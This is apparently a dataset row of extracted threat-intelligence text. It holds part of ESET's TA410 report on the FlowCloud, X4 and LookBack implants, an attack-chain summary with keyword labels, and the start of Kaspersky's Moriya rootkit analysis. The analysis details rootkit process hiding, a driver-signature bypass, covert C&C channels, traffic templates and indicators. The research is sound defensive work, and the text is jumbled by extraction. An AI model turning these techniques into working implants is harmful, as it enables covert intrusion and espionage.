ciphertext_length; i++)2plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFFFigure 16. Pseudocode for the DLL decryption routineThis newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above. On top of those, it also uses a few tricks of its own:Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW. Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed. Exits if the process’s executable is not the expected DLL hijacking target (e.g., setlang.exe).The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region. This code inside the new process launches a thread that decrypts and loads the fcClient module before calling its startModule export. That function will perform the final stages of the installation and load the DLL containing the backdoor functionality.Driver (hidmouse.sys)FlowCloud’s driver serves a dual purpose: it acts as both a keylogger and a rootkit. It accomplishes this mainly by hijacking native drivers’ handler functions for specific I/O control codes and replacing them with its own:Read (IRP_MJ_READ) for the keyboard driver (kbdclass or KeyboardClass0) Read (IRP_MJ_READ) for the mouse driver (mouclass or PointerClass0) Device control (IRP_MJ_DEVICE_CONTROL) for the network driver (tcpip or nsiproxy)The driver also provides kernel-level functionalities to be used by the RAT. They can be invoked via IO control codes or by writing to specific registry keys.This module is signed with a certificate with the thumbprint 02ED6A578C575C8D9C72398E790354B095BB07BC. Issued to Hangzhou Leishite Laser Technology Co. in 2012 by Wosign and revoked in 2014, it seems most likely this certificate was stolen.KeyloggingIn its IRP_MJ_READ handlers for keyboard and mouse events, the driver simply records IO events to lookaside lists before passing them to the legitimate handler. This ensures that the driver doesn’t interfere in a way that could be noticeable by the user. These events are then parsed to the format used by the backdoor’s keymouse_manager and written to the named pipe \\.\pipe\namedpipe_keymousespy_english.RootkitAfter hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers.The rootkit can prevent processes from being shown by utilities that list running processes, such as Task Manager. As shown in Figure 17, it achieves this by removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure. Since this structure is not part of the public API and can change between releases, the rootkit contains code to match the operating system’s build number to the correct offsets in this structure. That code covers all versions from Windows XP to Windows 10 20H1. This functionality can be invoked on any process via the IOCTL_HIDE_PROCESS_BY_PROCESSID (0x222028) control code. It is also used, on driver startup, to hide the process with the PID contained in the registry key HKLM\HARDWARE\{76BA14B7-AF0C-4dc9-9E9D-2A6970F231D9}. This process is further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure.17/26Figure 17. Function used to prevent a process from being displayed in lists of running processesThrough its hijacking of the network driver, the rootkit can also hide a single process’s network traffic from local utilities. The process whose traffic is to be hidden is set through the IOCTL_SET_TRAFFICHIDE_PROCESSID (0x222048) control code.Some of the rootkit’s functions are used by the fcClientDll module to hide the process in which it is running.Control codes to manipulate a process name in various internal structures are also exposed by the driver.Persistence module (fcClientWD)This module is relatively simple compared to other components. The previously mentioned NetTask already accomplishes persistence in most cases, by executing on system startup. This module complements that mechanism by ensuring persistence in a very specific edge case where execution of the malware might be interrupted: the user logs out on a system with hibernation and Fastboot enabled. On systems where either of those is disabled, this module does nothing.FlowCloud v4.1.3This older version of FlowCloud has already been described in a Proofpoint blogpost and presents similarities to the newer version described in the preceding subsections, so we will only highlight notable differences and new information revealed by our analysis.This version runs multiple anti-analysis and anti-detection checks before executing its payload, and terminates if any of those tests detect that the process is being analyzed. It checks running processes for executables of several known cybersecurity vendors. While most of these names are also present in version 5, this list is not a strict subset of the one v.5 uses. This tends to support the proposition that versions 4 and 5 of FlowCloud are maintained in parallel.It also embeds a DLL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources. This library is loaded in memory and all of the anti-analysis/anti-sandboxing checks it implements are run.Interestingly, the driver installed is the same as the one for version 5.0.2. Those used by version 5.0.3 provide identical functionality, but differ slightly.TA410 – LookingFrogLookingFrog uses two main malware families: X4 and LookBack. We have seen both of them on machines belonging to the same victim.X4X4 is a custom backdoor that is used as a first stage, before LookBack is deployed. It is loaded by a VMProtect-ed loader, usually named PortableDeviceApi.dll or WptsExtensions.dll. Unfortunately, we were not able to uncover any persistence method.18/26The loader injects an orchestrator into memory in a svchost.exe process. In turn, the orchestrator injects the network component into memory and communicates with it via a file located at C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\Log\rsa.txt. Figure 18 shows a summary of the X4 components.Figure 18. Summary of the X4 componentsThe network component is shellcode. It is encrypted using the AES algorithm and stored in the Windows registry. Table 2 shows the three registry keys used by X4.Table 2. Network shellcode registry keysRegistry KeyDescriptionHKLM\SOFTWARE\Microsoft\DRM\X4Key AES key. HKLM\SOFTWARE\Microsoft\DRM\PSKey Name of the process into which the shellcode will be injected HKLM\SOFTWARE\Microsoft\DRM\X4Data Encrypted shellcode.(spoolsv.exe).The decrypted shellcode looks like it was based on Metasploit and communicates with a hardcoded IP address via HTTP. An interesting characteristic is that it uses the fake Host header onedrive.live.com.Every second, the orchestrator, which lives in memory only, reads the cleartext rsa.txt file to check whether there are new commands to execute. The commands are received from the C&C server, via the network shellcode. In the orchestrator, the commands are identified by a numerical identifier that is computed from the command name, as shown in Figure 19.Figure 19. Custom hash function seen in X4The orchestrator handles seven commands, detailed in Table 3. Output of these commands is written to C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\Log\output.log.Table 3. X4 backdoor commandsIDNameDescriptioncan also modify X4Key and PSKey.0x3ECFF9B9D92 osload Write new encrypted shellcode to HKLM\SOFTWARE\Microsoft\DRM\X4Data. It 0x3F5FAFC0EDD pskill Kill a process by PID. 0x3F5FB1E6015 pslist List the running processes using CreateToolhelp32Snapshot and Process32Next. 0x3B6C27610D1 inject Decrypt and inject shellcode, from encrypted form on disk, into memory. 0x6D6E70D40exec Execute a given command line. live cacls Modify the access controls of a given object using SetEntriesInAclA,Get the PID of the process in which the orchestrator is running.SetNamedSecurityInfoA and BuildExplicitAccessWithName.X4 provides basic functionalities to control the machine remotely, but it lacks more advanced spying capabilities.LookBack19/26The LookBack backdoor has previously been described by Proofpoint; we are therefore providing a quick summary and our analysis of the custom network protocol.BackdoorIn all samples we observed, the LookBack loader is a legitimate version of libcurl.dll with the curl_share_init (ordinal #52) export modified to load the SodomNormal communications module. This corroborates the observation by Proofpoint researchers. This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4. The encryption/decryption function, shown in Figure 20, always uses the same key.Figure 20. Decompiled view of the function used to encrypt and decrypt the embedded moduleThe SodomNormal component tries to read configuration information from a sodom.ini file. This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC. If this file is unavailable or invalid, a hardcoded default configuration is used.A unique victim ID is then generated from the victim’s CPUID, username, and IP address. This is sent to the server along with the computer’s name and the configuration data. The communications module then downloads the main backdoor module, named SodomMain, from the C&C server. Unfortunately, we couldn’t obtain this module.Communication protocolLookBack can communicate over HTTP or via its “normal protocol”. In either case, the data being transferred is the same.LookBack’s normal protocol uses raw TCP sockets and a custom message format described in Table 4. This message is composed of eight header fields, followed by a body of variable length. The message body is encrypted with the function previously described for the SodomNormal resource in the loader (Figure 20). The encrypted data is then compressed with the deflate algorithm via the compress function of the statically linked zlib.Table 4. LookBack message formatFieldOffset (bytes) Compressed body size 0x08 Uncompressed body size 0x0C Checksum 0x10The constant 0x48AB2EC2. Messages that don’t start with this magic value are discarded.NoteCRC32 of the message body.20/26FieldOffset (bytes)NoteMessage type0x14<Message dependent> 0x20Table 5. LookBack message typesMessagetypeUsed byInteger value indicating the message’s content and the associated action to be performed. We have found code for over 50 message types. There seems to be little to no overlap between the values used by the client and the server. Table 5 presents the types we have analyzed in more depth.The message body can be empty. In this case, the checksum and length fields are set to 0x00.Description2 36 and 38 35 and 37 41 42victim host.Client Register with C&C server. The body contains configuration and information about the Server Acknowledgment for message type 2. Client Request to download the main backdoor component (SodomMain). Server Reply to message type 8. The message body contains the SodomMain file. Client Transfer file to server in message body. Server Response to message 36 or 38. Client Request file from server. Server Transfer file to client in message body (response to message 41)The HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as legitimate HTTP. It uses a pair of hardcoded templates, one for client requests and another for server responses. The fields required for HTTP, such as content length, address, and port number, are filled in with the correct values; useless data is used for the others.For client requests, the messages are encoded with a modified hexadecimal algorithm that uses the encoding alphabet a-p instead of the conventional 0-9a-f. This provides some obfuscation and ensures that messages will not contain binary data or be obviously hex encoded, both of which could look suspicious in an application/x-www-form- urlencoded message. The request’s body is composed of this encoded value prefixed with the hardcoded string id=1&op=report&status=. Client request and server response templates are shown in Figure 21 and Figure 22 respectively, with the template fields in angle brackets.123456789101112POST <C&C address + port>/status.php?r=<epoch timestamp><random 16-bit int> HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: en-usUser-Agent: <return value of ObtainUserAgentString OR ""Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"">Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: <C&C url>Content-Length: <content length>Connection: Keep-AliveCache-Control: no-cacheid=1&op=report&status=<encoded LookBack message>Figure 21. Template used for HTTP client requestsOn the server side, the data described in the previous section is sent directly as binary data in the body with a header purporting it is a GIF image.123456HTTP/1.1 200 OKServer: nginx/1.12.2Date: <current time> GMTLast-Modified: <current time - 100 seconds> GMTETag: <3 random 16-bit ints>Accept-Ranges: bytes21/26789Content-Length: <content length>Keep-Alive: timeout=5, max=100Connection: Keep-Alive10Content-Type: image/gif1112<LookBack message>Figure 22. Template used for HTTP server responsesTA410 – JollyFrogThis third team uses off-the-shelf malware from the known malware families QuasarRAT and Korplug (aka PlugX). JollyFrog mostly aligns with what was described by Fortinet as APT10.KorplugKorplug, also known as PlugX, is a backdoor that has been used for years by many different cyberespionage groups. Despite being well known, it is still in use and we have observed TA410 using it as recently as in April 2021.In the case of TA410, Korplug arrives as a RARSFX archive, generally named m.exe, containing three files:qrt.dll: A custom loader. qrtfix.exe: A legitimate signed application from F-Secure, vulnerable to DLL search-order hijacking. qrt.dll.usb: The Korplug shellcode.The loader allocates memory using VirtualAlloc and copies the content of qrt.dll.usb there. Then it jumps right into the shellcode that will decompress and load the Korplug payload.QuasarRATQuasarRAT is a full-featured backdoor freely available on GitHub. It is used by numerous threat actors who perform cyberespionage or cybercrime.TA410 uses a custom downloader and a custom loader written in .NET, which are convenient for identifying their instances of QuasarRAT among all the noise created by other attackers.Named sll.exe, this downloader is digitally signed with the certificate seen in Figure 23. The certificate is likely stolen and belongs to  (translated: Beijing Heyingxunshi Technology Co., Ltd.) with thumbprint 850821D88A4475F0310F10FBA806353A4113D252. Although the certificate has now been revoked, it was still valid when this sample was signed on August 10th, 2020.22/26Figure 23. Digital signature of the QuasarRAT downloaderThis downloader simply downloads the loader and encrypted QuasarRAT payload from the hardcoded C&C server url at /rwjh/new/. This server was previously linked to FlowCloud (FlowingFrog). The loader is named PresentationCache.exe and is protected with DNGuard, a commercial .NET packer. It is also signed with the same certificate as the downloader. It decrypts and loads the final QuasarRAT payload, which uses cahe.microsofts[.]org as its C&C server. ConclusionTA410 is a cyberespionage umbrella targeting high-profile entities such as governments and universities worldwide. ESET is revealing its latest findings about this group, including results from ongoing research, during Botconf 2022.Initial access to targets is obtained by exploiting vulnerable internet-facing applications such as Microsoft Exchange, or by sending spearphishing emails with malicious attachments such as RTF documents created via the Royal Road builder. Even though the JollyFrog team uses generic tools, FlowingFrog and LookingFrog have access to complex implants such as FlowCloud and LookBack. YARA and Snort rules for these implants are available in ESET’s GitHub repository.For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.ESET Research now also offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the ESET Threat Intelligence page. IoCs FilesSHA-1FilenameDetectionhhh.exewinver64.dllhidmouse.sysWin32/Agent.UWR Win32/Agent.UNL Win32/Agent.UKR Win64/Agent.UKR Win32/Agent.ULH Win32/Agent.ABYK Win32/Agent.ULH Win64/Agent.KM Win32/ParanoidFish.A Win64/Agent.UKR Win64/Agent.UKR Win32/Agent.TWI Win32/Agent.TWI Win64/Agent.UKR Win32/Agent.TWI Win32/Agent.TWI Win32/Agent.UKD Win32/Rozena.CP Win32/Agent.ULLN/A 38D0E92AFF991CFC9C68D7BAAD6CB85916139AF5 hidmouse.sys AF978ED8AD37CE1437A6B42D96BF518D5C4CFD19 hidmouse.sys B70F3A3A9B5B8506EE95791469CA496E01AD7DAF winver32.dll 014421BDB1EA105A6DF0C27FC114819FF3637704 EA298866E5A61FEEA4D062987F23B10A78C8A4CA N/A 021B9E2E8AA30B29569254C0378A9F43E4F32EEC 2A2F08FAD6B0A86DC94885224687D954E739CC21 N/A 3658B7CCA13C8C8AD03E9B6AEFE4B9CBE48E3C81 hidmouse.sys DB2DF1BDF8145CB8ABA3A2026A3CC3EF4F1762BE phx.dll EDE2AB811311FC011B1E89C5A0B7A60C123B7398 7AA35BA7030AFCD271436DE8173D7B2F317A1BFC libcurl.dll A5C02ABE698300F3DE0B7CC7F0856652753831DA libcurl.dll 613C4AFAE8F5F80F22DCD1827E3230FCA361ADA5 libcurl.dll 859CD6DFDADAB3D6427C6C1C29581CB2094D648F meterpreter.exe DBEA7F0C0D2BF8BC365A2D1572CA1538FE8FB9A3 responsor.dat ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20 .doc Win32/Exploit.Agent.TY 7BA42061568FF6D9CA5FE5360DCE74C25EA48ADA N/A D81215890703C48B8EA07A1F50FEC1A6CA9DF88B N/A F359D3C074135BBCA9A4C98A6B6544690EDAE93D OnKeyToken_KEB.dll Win32/Injector.ELGA 621B31D5778EC2FB72D38FB61CED110A6844D094 N/A BC11DC8D86A457A07CFE46B5F2EF6598B83C8A1F m.exe qrt.dll.usb BDECA89B4F39E6702CE6CBBC9E6D69F6BBAB01C8 N/A D95185A4A3F8512D92F69D2ED7B8743638C54BE8 N/A BE7F0E41CD514561AED43B07AA9F5F0842BF876C HTra.exe 7F663F50E9D6376715AEB3AB66DEDE038258EF6C HTran13.exe BEDA1224B3BB9F98F95FF7757D2687F4D9F4B53A event.exe 2B61E7C63A0A33AAC4CF7FE0CEB462CF6DACC080 htran.exe EF3C796652141B8A68DCCF488159E96903479C29 6B547C244A3086B5B6EA2B3A0D9594BBE54AE06B inbt.zipFlowCloud v5 FlowCloud D TA410 32-bit TA410 64-bit Win32/Agent.ACKQ Packed Tend Win32/TrojanDownloader.Agent.FLI Unpacked Te Tendyron ma X4 network s Win64/Rozena.AO Korplug drop Win32/Injector.EMVA Korplug loade Win32/Injector.EMVA MSIL/TrojanDownloader.Agent.GPS QuasarRAT d Simple cmd.e This is a Pyth for the vulnerMSIL/Spy.Agent.AES Win32/HackTool.Hucline.AB Win32/HackTool.Hucline.S Win32/Agent.UJN Win32/HackTool.Hucline.AB Win32/HackTool.Hucline.AB Python/HackTool.Agent.J4CDCE3AF614C2A5E60E71F1205812AB129C0955B msd017.exePython/Exploit.MS17-010.Bsll.exe PresentationCache.exe MSIL/Agent.TZGhtran_f-secury.exe23/26Certificates02ED6A578C575C8D9C72398E790354B095BB07BC Hangzhou Leishite Laser Technology Co., Ltd. Hangzhou Leishite Laser Technology Co., Ltd. 2012-03-29 09:07:04 UTC 2014-04-02 06:24:19 UTCSerial number 0F8B600FF1882E Serial number 4ED8730F4E1B8558CD1CB0107B5F776B Thumbprint Subject CN    (translation: Beijing Heyingxunshi Technology Co., Ltd.) Subject O    (translation: Beijing Heyingxunshi Technology Co., Ltd.) Subject OU    ( R&D Department) Valid to (Beijing) CN 2019-11-13 00:00:00 UTC 2020-11-12 23:59:59 UTC850821D88A4475F0310F10FBA806353A4113D252NetworkDomainIPFirst seenDetails43.254.216[.]104 2020-06 Delivery server 45.124.115[.]103 2020-08 Delivery server 161.82.181[.]4 2020-12 Delivery server 43.254.219[.]153 2020-07 X4 C&C server 154.223.141[.]36 2020-06 HTran C&C server 103.139.2[.]932020-10cahe.microsofts[.]com ffca.caibi379[.]com smtp.nsfwgo[.]com45.124.115[.]103 2020-06 185.225.19[.]17 2021-01 94.158.245[.]249 2020-03 5.252.179[.]227 2021-03 222.186.151[.]141 2019-11 47.111.22[.]65 2020-09 114.55.109[.]199 2020-05 2020-09 185.225.17[.]39 N/Adlaxpcmghd[.]com wwww.dlmum[.]com MITRE ATT&CK techniquesTendyron C&C server QuasarRAT C&C server QuasarRAT downloader C&C server Korplug C&C server LookBack C&C server LookBack C&C server LookBack C&C server LookBack C&C server FlowCloud C&C server FlowCross C&C server FlowCloud C&C server LookBack C&C server FlowCloud C&C serverThis table was built using version 9 of the MITRE ATT&CK framework.TacticIDNameDescriptionT1587.001 Develop Capabilities: DevelopmentTA410 develops LookBack and FlowCloud.TA410 uses stolen code-signing certificates.Initial AccessExecutionT1190T1588.005 Obtain Capabilities: Exploits Exploit Public-Facing Native APIT1566.001T1106T1129T1203T1559.001Shared Modules Exploitation for Client ModelTA410 had exploits for ProxyLogon and ProxyShell. TA410 has exploited web server vulnerabilities for initial access. TA410 uses malicious RTF and DOCX attachments to compromise victims. FlowCloud makes extensive use of the Windows API to execute commands and launch processes. TA410’s backdoors can load DLLs and execute their payloads. TA410 uses Royal Road RTF documents to compromise victims.FlowCloud uses COM interfaces to schedule tasks and perform WMI queries.24/26TacticIDT1047NameWindows Management InstrumentationT1053.005 Scheduled Task/Job:PersistenceT1505.003Defense EvasionDiscoveryCollectionDescriptionTA410 uses WMI for lateral movement and information gathering.FlowCloud creates a scheduled task for persistence.TA410 plants webshells on vulnerable web servers.FlowCloud can be configured to create a service for persistence.FlowCloud files are distributed and stored in encrypted form.The driver component of FlowCloud masquerades as a mouse driver service. Files named after legitimate utilities are written into the %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\ subdirectory. FlowCloud uses a rootkit to hide its network traffic and processes from system utilities. FlowCloud uses both regular and reflective DLL injection. It also manually loads some DLLs, bypassing calls to LoadLibrary. TA410’s backdoors perform process injection to masquerade as harmless processes. One of FlowCloud’s DLLs replaces instructions in the loading process to make it execute code written in its memory. FlowCloud uses module stomping to hide the loading of its main backdoor. Multiple TA410 backdoors communicate with their C&C through encrypted and obfuscated channels. FlowCloud uses DLL Side-Loading to launch its second-stage dropper. Some versions of FlowCloud use the Pafish utility to detect virtualization, sandboxes, and debuggers. FlowCloud can create processes using tokens acquired from legitimate processes.FlowCloud deletes its rootkit’s executable after launching it.FlowCloud backdates some files and services to 2013. When logging mouse events, FlowCloud gathers information about the application running in the foreground. Multiple TA410 backdoors can list running processes. FlowCloud uses the IShellAppManager COM object to list installed software. FlowCloud can search through connected file systems and obtain directory listings. FlowCloud can list connected camera devices.FlowCloud can discover and use locally configured proxies.Scheduled Task Create or Modify Obfuscated Files or Masquerade Task or Legitimate Name or Dynamic-link Library HijackingT1543.003T1027T1036.004T1036.005T1014T1055.001T1055T1055.003T1140T1497T1134.002T1574.002Host: File DeletionT1055.012 Process Injection: Files or Information Hijack Execution Flow: DLL Side- Process with Token T1070.004 Indicator Removal on T1070.006 Indicator Removal on File and Directory T1518T1083T1120T1016T1012FlowCloud components use registry keys to signal each other. FlowCloud registers a listener to steal clipboard data when it is changed. FlowCloud logs mouse clicks. FlowCloud records keystrokes. FlowCloud takes screenshots at regular intervals. FlowCloud uses OpenCV to take pictures using connected camera devices. FlowCloud has audio capture functionality.Clipboard Data T1056.001 Input Capture: Automated Collection FlowCloud automatically collects data based on timers and FlowCloud stores collected data in local SQLite databases T1074.001 Data Staged: Local prior to exfiltration. FlowCloud can exfiltrate files from local file systems.T1005Data Staging Data from Local System25/26TacticID T1025T1560.002T1560.003T1071.001Data from Removable Data: Archive via Data: Archive via Non-Application Layer T1132.001 Data Encoding: Standard Encoding T1132.002 Data Encoding: Non- Data Transfer Size Shutdown/RebootT1573.001T1030T1529NameDescriptionFlowCloud can exfiltrate files from removable drives.FlowCloud and LookBack use a statically linked zlib library to compress data.FlowCloud compresses some collected data by removing duplicates and similar screen captures.LookBack and FlowCloud can send and receive data over HTTP.LookBack can communicate over raw TCP sockets. FlowCloud uses Protobuf to encode C&C commands and configuration. LookBack encodes binary data using a custom hex-encoding method. FlowCloud can use XOR, TEA, RC4 and a modified AES algorithm to encrypt traffic and files. FlowCloud uses local caches to stage data and exfiltrates their content when it reaches a size specified in its configuration. FlowCloud can force a system crash or shutdown.27 Apr 2022 - 03:00PMSign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource CenterNewsletterDiscussion26/26 ","1. Initial access through spearphishing emails with malware documents or exploiting public-facing applications. 2. First stage malware (Tendyron, X4) gains initial foothold. 3. First stage malware downloads and executes second stage (FlowCloud, LookBack). 4. Second stage malware establishes persistence through scheduled tasks, services, etc. 5. Second stage malware begins collecting data from system through keylogging, screenshots, microphone recording, etc. 6. Collected data is encrypted and stored locally in databases or caches. 7. C&C communication provides commands and exfiltrates data from second stage malware. 8. LookBack can proxy commands to first stage X4 malware. 9. FlowCloud rootkit hides malware processes and network traffic. 10. Malware leverages stolen credentials for lateral movement. ",valid_3,"['initial access', 'spearphishing emails', 'Malware', 'Exploit', 'application', 'first', 'Tendyron', 'X4', 'second stage', 'FlowCloud', 'LookBack', 'persistence', 'scheduled task', 'tasks', 'services', 'system', 'keylogging', 'screenshots', 'recording', 'Collected data', 'Local', 'databases', 'caches', 'C&C communication', 'commands', 'exfiltrates', 'rootkit', 'processes', 'network traffic', '10', 'lateral movement']",initial access; spearphishing emails; Malware; Exploit; application; first; Tendyron; X4; second stage; FlowCloud; LookBack; persistence; scheduled task; tasks; services; system; keylogging; screenshots; recording; Collected data; Local; databases; caches; C&C communication; commands; exfiltrates; rootkit; processes; network traffic; 10; lateral movement.
"5/7/2021Operation TunnelSnake | SecurelistOperation TunnelSnakesecurelist.com/operation-tunnelsnake-and-moriya-rootkit/101831Formerly unknown rootkit used to secretly control networks of regional organizationsurl TunnelSnake | SecurelistWindows rootkits, especially those operating in kernel space, are pieces of malware infamous for their near absolute power in the operating system. Usually deployed as drivers, such implants have high privileges in the system, allowing them to intercept and potentially tamper with core I/O operations conducted by the underlying OS, like reading or writing to files or processing incoming and outgoing network packets. The capability to blend into the fabric of the operating system itself, much like security products do, is the quality that earns rootkits their notoriety for stealth and evasion.Having said that, the successful deployment and execution of a rootkit component in Windows has become a difficult task over the years. With Microsoft’s introduction of Driver Signature Enforcement, it has become harder (though not impossible) to load and run new code in kernel space. Even then, other mechanisms such as Kernel Patch Protection (also known as PatchGuard) make it hard to tamper with the system, with every change in a core system structure potentially invoking the infamous Blue Screen of Death.Consequently, the number of Windows rootkits in the wild has decreased dramatically, with the bulk of those still active often being leveraged in high profile APT attacks. One such example came to our attention during an investigation last year, in which we uncovered a formerly unknown Windows rootkit and its underlying cluster of activity. We observed this rootkit and other tools by the threat actor behind it being used as part of a campaign we dubbed ‘TunnelSnake’, conducted against several prominent organizations in Asia and Africa.In this blog post we will focus on the following key findings that came up in our investigation:A newly discovered rootkit that we dub ‘Moriya’ is used by an unknown actor to deploy passive backdoors on public facing servers, facilitating the creation of a covert C&C communication channel through which they can be silently controlled; The rootkit was found on networks of regional diplomatic organizations in Asia and Africa, detected on several instances dating back to October 2019 and May 2020, where the infection persisted in the targeted networks for several months after each deployment of the malware; We observed an additional victim in South Asia, where the threat actor deployed a broad toolset for lateral movement along with the rootkit, including a tool that was formerly used by APT1. Based on the detection timestamps of that toolset, we assess that the attacker had a foothold in the network from as early as 2018; A couple of other tools that have significant code overlaps with Moriya were found as well. These contain a user mode version of the malware and another driver-based utility used to defeat AV software.url TunnelSnake | SecurelistWe provided information about this operation in our threat intelligence portal in August 2020. More details and analysis are available to customers of our private APT reporting service. For more details contact: intelreports@kaspersky.com.What is the Moriya rootkit and how does it work?Our investigation into the TunnelSnake campaign started from a set of alerts from our product on a detection of a unique rootkit within the targeted networks. Based on string artefacts within the malware’s binaries, we named this rootkit Moriya. This tool is a passive backdoor which allows attackers to inspect all incoming traffic to the infected machine, filter out packets that are marked as designated for the malware and respond to them. This forms a covert channel over which attackers are able to issue shell commands and receive back their outputs.The rootkit has two traits that make it particularly evasive. The packet inspection happens in kernel mode with the use of a Windows driver, allowing attackers to drop the packets of interest before they are processed by the network stack, thus ensuring they are not detected by security solutions. Secondly, the fact that the rootkit waits for incoming traffic rather than initiating a connection to a server itself, avoids the need to incorporate a C&C address in the malware’s binary or to maintain a steady C&C infrastructure. This hinders analysis and makes it difficult to trace the attacker’s footprints.The figure below illustrates the structure of the rootkit’s components. They consist of a kernel mode driver and a user mode agent that deploys and controls it. In the following sections we will break down each of these components and describe how they operate to achieve the goal of tapping into the target’s network communication and blending in its traffic.url TunnelSnake | SecurelistFig. 1. The architecture of the Moriya rootkitUser mode agent analysisThe user mode component of the Moriya rootkit has two purposes. One is to deploy the kernel mode component of the malware on the machine and the other is to leverage the covert communication channel created by it to read shell commands sent from the C&C server to the compromised machine and to respond to them. Since Moriya is a passive backdoor intended to be deployed on a server accessible from the internet, it contains no hardcoded C&C address and relies solely on the driver to provide it with packets filtered from the machine’s overall incoming traffic.url TunnelSnake | SecurelistThe first order of business for the attacker when using Moriya is to gain persistence on the targeted computer. For this purpose, the user mode agent’s DLL contains an export function named Install, which is intended to create a service named ZzNetSvc with the description ‘Network Services Manager’ and start it. In turn, the path to the user mode agent’s image is set to the registry key HKLM\System\CurrentControlSet\Services\ZzNetSvc\Parameters\ServiceDll so that it will be invoked from its ServiceMain export each time the service is initiated.Next, after the service is started, the agent will attempt to load the rootkit’s driver into the system. Its binary is bundled as two driver images within the DLL’s resource section, corresponding to 32- and 64-bit architectures, while in reality only one of them is written to disk. In the cases we analyzed, the agent DLLs were compiled for 64-bit systems, dropping a 64-bit driver to the drivers directory in the system path, under the name MoriyaStreamWatchmen.sys, hence the rootkit’s name.Fig. 2. Code that writes the Moriya driver to diskThe agent uses a known technique whereby the VirtualBox driver (VBoxDrv.sys) is leveraged to bypass the Driver Signature Enforcement mechanism in Windows and load Moriya’s unsigned driver. DSE is an integrity mechanism mandating that drivers are properly signed with digital signatures in order for them to be loaded, which was introduced for all versions of Windows starting from Vista 64-bit. The technique used to bypass it was seen in use by other threat actors like Turla, Lamberts and Equation.Moriya’s user mode agent bypasses this protection with the use of an open-source code named DSEFIX v1.0. The user agent dumps an embedded VBoxDrv.sys image of version 1.6.2 to disk and loads it, which is then used by the aforementioned code to map Moriya’s unsigned driver to kernel memory space and execute it from its entry point. These actions are made possible through IOCTLs implemented in VBoxDrv.sys that allow writing to kernel address space and executing code from it. Throughout this process, the bypass code is used to locate and modify a flag in kernel space named g_CiOptions, which controls the mode of enforcement.[1]url TunnelSnake | SecurelistAfter the unsigned driver is loaded, the agent registers a special keyword that is used as a magic value, which will be sought in the first bytes of every incoming packet passed on the covert channel. This allows the rootkit to filter marked packets and block them for any application on the system other than the user mode agent. The registration of the value is done through a special IOCTL with the code 0x222004 sent to the driver, where a typical magic string is pass12.Fig. 3. Registration of the packet magic value using a designated IOCTLExcept for its covert channel communication feature, Moriya is capable of establishing a reverse shell session using an overt channel. For this purpose, it waits for a special packet that consists of a message with the structure connect <c2_address> <c2_port>. The address and port are parsed and used by the agent to start a new connection to the given server, while creating a new cmd.exe process and redirecting its I/O to the connection’s socket. The handles for the newly created process and its main thread are destroyed to avoid detection.In any other case, the agent attempts to read the incoming TCP payload from the driver, which will be retrieved as soon as a designated packet with a magic number and shell command is received. An attempt is made to read the data with a plain ReadFile API function as a blocking operation, i.e., reading is accomplished only once the buffer in kernel mode is populated with data from a Moriya-related packet.Upon an incoming packet event, the agent creates a new cmd.exe process and redirects its I/O using named pipes. One pipe is used to read the retrieved shell command from the covert channel and the other is used to write the shell’s output (obtained from the stdout and stderr streams) back to it after execution. To write any data back, the agent uses the WriteFile API function with the driver’s handle.url TunnelSnake | SecurelistAll traffic passed on the channel is encoded with a simple encryption scheme. Every sent byte has its payload, following the magic string, XORed with the value 0x05 and then negated. Following the same logic, to decode the incoming traffic’s payload, every byte of it should be first negated and then XORed with 0x05.Fig. 4. Code used for packet encodingKernel mode driver analysisThe Moriya rootkit’s driver component makes use of the Windows Filtering Platform (WFP) to facilitate the covert channel between the compromised host and the C&C server. WFP provides a kernel space API that allows driver code to intercept packets in transit and intervene in their processing by the Windows TCP/IP network stack. This makes it possible to write a driver that can filter out distincturl TunnelSnake | Securelistpacket streams, based on developer-chosen criteria, and designate them for consumption by a specific user mode application, as is the case in Moriya.The driver fetches the distinct Moriya-related traffic using a filtering engine. This is the kernel mode mechanism used to inspect traffic according to rules that can be applied on various fields across several layers of a packet (namely data link, IP and transport), making it possible to handle matching packets with unique handlers. Such handlers are referred to as callout functions.In the case of Moriya, the filtering engine is configured to intercept TCP packets, sent over IPv4 from a remote address. Each packet with these criteria will be inspected by a callout function that checks if its first six bytes correspond to the previously registered magic value, and if so, copies the packet contents into a special buffer that can be later read by the user mode agent. The matching packet will then be blocked in order to hide its presence from the system, while any other packet is permitted to be processed as intended by the network stack.To allow the crafting of a response back to the server, the callout function saves a special value in a global variable that identifies the received TCP stream. This value is called a flowHandle, and is taken from the packet’s corresponding FWPS_INCOMING_METADATA_VALUES0 struct. When the user issues a response to the server via the driver, the latter would craft a new packet using the FwpsAllocateNetBufferAndNetBufferList0 function and insert the response data and target server based on the saved flowHandle to it, using the function FwpsStreamInjectAsync0.url TunnelSnake | SecurelistFig. 5. Code that creates a new packet, designates it for the flow of the corresponding incoming TCP packet and injects data written from user space into itAs formerly mentioned, the driver registers several functions that are exposed to the user mode agent in order to interact with it:IRP_MJ_READ: used to allow the user mode agent to read the body of a Moriya TCP packet from a special buffer to which it is copied upon receipt. The function itself waits on an event that gets signaled once such a packet is obtained, thus turning the ReadFile function called by the user mode agent into a blocking operation that will wait until the packet is picked up by the driver. IRP_MJ_WRITE: injects user-crafted data into a newly created TCP packet that is sent as a response to an 